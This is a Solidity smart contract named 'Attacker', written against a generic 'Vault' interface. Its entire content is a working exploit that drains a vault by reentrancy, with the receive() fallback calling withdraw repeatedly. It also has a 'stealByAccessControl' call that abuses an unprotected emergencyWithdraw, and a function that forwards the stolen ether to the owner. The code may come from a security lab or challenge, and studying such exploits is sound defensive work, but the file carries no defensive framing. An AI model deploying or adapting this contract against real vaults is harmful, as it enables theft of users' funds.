// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface Vault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function emergencyWithdraw(address to, uint256 amount) external;
}

contract Attacker {
    address public immutable owner;

    address public targetVault;
    uint256 public attackAmount;
    uint256 public maxLoops;
    uint256 public loopCount;
    bool public attacking;

    event AttackStarted(address indexed vault, uint256 attackAmount, uint256 maxLoops);
    event Reentered(uint256 loopCount, uint256 vaultBalance);
    event AttackFinished(uint256 attackerBalance);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function attack(address vault, uint256 amount, uint256 loops) external payable onlyOwner {
        require(vault != address(0), "ZERO_VAULT");
        require(amount > 0, "ZERO_AMOUNT");
        require(msg.value == amount, "VALUE_MUST_EQUAL_AMOUNT");

        targetVault = vault;
        attackAmount = amount;
        maxLoops = loops;
        loopCount = 0;
        attacking = true;

        emit AttackStarted(vault, amount, loops);

        Vault(vault).deposit{value: amount}();
        Vault(vault).withdraw(amount);

        attacking = false;
        emit AttackFinished(address(this).balance);
    }

    function stealByAccessControl(address vault, uint256 amount) external onlyOwner {
        Vault(vault).emergencyWithdraw(address(this), amount);
    }

    function withdrawProfit() external onlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "NO_ETH");

        (bool success,) = payable(owner).call{value: amount}("");
        require(success, "PROFIT_SEND_FAILED");
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (
            attacking &&
            targetVault != address(0) &&
            attackAmount > 0 &&
            loopCount < maxLoops &&
            address(targetVault).balance >= attackAmount
        ) {
            loopCount += 1;
            emit Reentered(loopCount, address(targetVault).balance);
            Vault(targetVault).withdraw(attackAmount);
        }
    }
}
